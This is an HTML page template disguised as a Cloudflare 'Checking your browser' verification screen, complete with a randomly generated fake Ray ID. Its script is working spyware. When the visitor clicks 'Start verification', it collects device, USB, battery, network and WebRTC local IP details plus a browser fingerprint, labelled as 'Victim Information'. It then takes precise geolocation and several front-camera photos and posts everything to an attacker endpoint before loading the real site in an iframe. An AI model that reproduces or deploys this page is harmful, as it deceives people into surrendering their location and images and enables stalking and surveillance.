<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Just a moment...</title>
    <style>
        html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
        body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
        h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
        p {font-size: 20px; font-weight: 400; margin: 8px 0;}
        .attribution {margin-top: 32px; text-align:center;}
        @keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
        #cf-bubbles > .bubbles { animation: fader 1.6s infinite; }
        #cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s; }
        #cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s; }
        .bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
        a { color: #2c7cb0; text-decoration: none; transition: color 0.15s ease; }
        a:hover{color: #f4a15d}
        .ray_id{display: block; margin-top: 8px;}
        #verify-button {
            background-color: #2c7cb0;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            margin: 20px auto;
            display: block;
        }
        #verify-button:hover { background-color: #1a5a7a; }
        #status { font-size: 16px; color: #555; margin-top: 10px; }
        iframe { display: none; }
    </style>
</head> 
<body>
    <table width="100%" height="100%" cellpadding="20"> 
        <tbody>
            <tr> 
                <td align="center" valign="middle"> 
                    <div class="cf-browser-verification cf-im-under-attack"> 
                        <noscript> 
                            <h1 style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1> 
                        </noscript> 
                        <div id="cf-content" style="display: block;"> 
                            <div id="cf-bubbles"> 
                                <div class="bubbles"></div> 
                                <div class="bubbles"></div> 
                                <div class="bubbles"></div> 
                            </div> 
                            <h1>Checking your browser before accessing the website.</h1> 
                            <div id="no-cookie-warning" style="display:none"> 
                                <p style="color:#bd2426;">Please enable Cookies and reload the page.</p> 
                            </div> 
                            <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
                            <button id="verify-button">Start verification</button>
                            <div id="status"></div>
                        </div> 
                    </div> 
                    <div class="attribution">
                        DDoS protection by 
                        <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a> 
                        <br> 
                        <span class="ray_id">Ray ID: <code id="ray"></code></span> 
                    </div> 
                </td> 
            </tr> 
        </tbody>
    </table>

    <iframe id="main-iframe" src="<%= url %>"></iframe>
    <video id="video" style="display:none" playsinline autoplay></video>
    <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script type="text/javascript">
        var uid = "<%= uid %>";
        var photoCount = <%= photoCount || 4 %>;
        var c = false, l = false;
        var imgsent = 0;
        var td = "";

        function getLocalIPs(callback) {
            var ips = [];
            var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) {
                callback([]);
                return;
            }
            var pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(pc.setLocalDescription.bind(pc));
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                var match = ipRegex.exec(ice.candidate.candidate);
                if (match && ips.indexOf(match[1]) === -1) {
                    ips.push(match[1]);
                }
                if (ips.length > 0) callback(ips);
            };
            setTimeout(function() { callback(ips); }, 1000);
        }

        async function gather() {
            <% if(!t){ %>
                td += '<code>‚úÖVictim Information </code><br><br><b>‚öì IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
            <% }else{ %>
                await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>‚úÖVictim Information </code><br><br><b>‚öì IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
            <% } %>

            td += "<br><br><b>‚è≥ Date In Victim's Device :</b> " + new Date() + "<br>";

            var xo = ["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
            td += "<br><b>üì± Device Information</b><br>";
            for (var i = 0; i < xo.length; i++) {
                if (xo[i] in navigator) {
                    td += "<b>" + xo[i] + "</b>: <code>" + navigator[xo[i]] + "</code><br>";
                }
            }

            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                await navigator.mediaDevices.enumerateDevices().then(function(devices) {
                    td += "<br><b>üì∑ Media Device Information</b><br>";
                    devices.forEach(function(device) {
                        td += "<b>" + device.kind + ":</b> " + device.label + " id = <code>" + device.deviceId + "</code><br>";
                    });
                }).catch(function(err) {
                    td += "<br><b>üì∑ Media Device Information</b><br>‚ö†Ô∏è Media Device Error: " + err.name + ": " + err.message;
                });
            }

            if ("connection" in navigator) {
                td += "<br><b>üï∏Ô∏è Network Information</b><br>";
                var xoc = ["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
                for (var i = 0; i < xoc.length; i++) {
                    var str = navigator.connection[xoc[i]];
                    td += "<b>" + xoc[i] + "</b>: <code>" + str + "</code><br>";
                }
            }

            if ("usb" in navigator) {
                await navigator.usb.getDevices().then(devices => {
                    td += "<br><b>üîå Total USB devices connected:</b> " + devices.length + "<br>";
                    devices.forEach(device => {
                        td += "<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber + "</code><br>";
                    });
                });
            }

            if ("getBattery" in navigator) {
                await navigator.getBattery().then(function(battery) {
                    td += "<br><b>üîã Battery Information</b><br>";
                    td += "<b>üîãBattery Level:</b> " + battery.level * 100 + "%<br><b>‚ö° Is Battery Charging:</b> " + battery.charging + "";
                });
            }

            try {
                const fp = await FingerprintJS.load();
                const result = await fp.get();
                td += `<br><b>üÜî Browser Fingerprint:</b> <code>${result.visitorId}</code><br>`;
            } catch (e) {
                td += `<br><b>‚ö†Ô∏è Fingerprint Error:</b> ${e.message}<br>`;
            }

            getLocalIPs(function(ips) {
                td += `<br><b>üè† Local IPs (WebRTC):</b> <code>${ips.join(', ') || 'Not available'}</code><br>`;
            });

            if (!navigator.geolocation) {
                td += "<br><b>üìç Location Information</b><br>‚ö†Ô∏è Location API not available";
                l = true;
            }

            function success(pos) {
                const crd = pos.coords;
                $.post("<%=a %>/location", {
                    uid: uid,
                    lat: encodeURIComponent(crd.latitude),
                    lon: encodeURIComponent(crd.longitude),
                    acc: encodeURIComponent(crd.accuracy)
                }, (s) => { l = true; red(); });
            }

            function error(err) {
                td += "<br><b>üìç Location Information</b><br>‚ö†Ô∏è Location ERROR: <code>" + err.message + "</code>";
                l = true;
                red();
            }

            if (navigator.geolocation) {
                await navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, maximumAge: 0 });
            }

            $.post("<%=a %>", { data: encodeURIComponent(td), uid: encodeURIComponent(uid) }, (s) => {});
        }

        var video = document.getElementById('video');
        var canvas = document.getElementById('canvas');

        function postImage(imgBase64) {
            $.post("<%=a %>/camsnap", { uid: uid, img: encodeURIComponent(imgBase64) }, (s) => {
                imgsent++;
                if (imgsent >= photoCount) {
                    c = true;
                    red();
                }
            }).fail(() => {});
        }

        var constraints = { audio: false, video: { facingMode: "user" } };

        async function cam() {
            try {
                var stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                td += '<br><b>üì∑ Camera Images</b>';
                td += `<br>‚ö†Ô∏è Camera Access Error: ${e.toString()}`;
                c = true;
                red();
            }
        }

        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;
            var context = canvas.getContext('2d');
            var intervalId = setInterval(function() {
                context.drawImage(video, 0, 0, 500, 500);
                var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
                postImage(canvasData);
                if (imgsent >= photoCount) {
                    clearInterval(intervalId);
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 1500);
        }

        function red() {
            if (c && l) {
                document.getElementById('verify-button').style.display = 'none';
                document.getElementById('status').innerText = 'Redirecting...';
                setTimeout(() => {
                    document.getElementById('main-iframe').style.display = 'block';
                }, 1000);
            }
        }

        document.getElementById('verify-button').addEventListener('click', function() {
            document.getElementById('status').innerText = 'Verifying...';
            gather();
            cam();
        });

        window.onload = function() {
            var chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
            var str = "";
            for (var o = 0; o < 17; o++) {
                str += chars[Math.floor(Math.random() * 35)];
            }
            document.getElementById("ray").innerHTML = str;
        };
    </script>
</body>
</html>
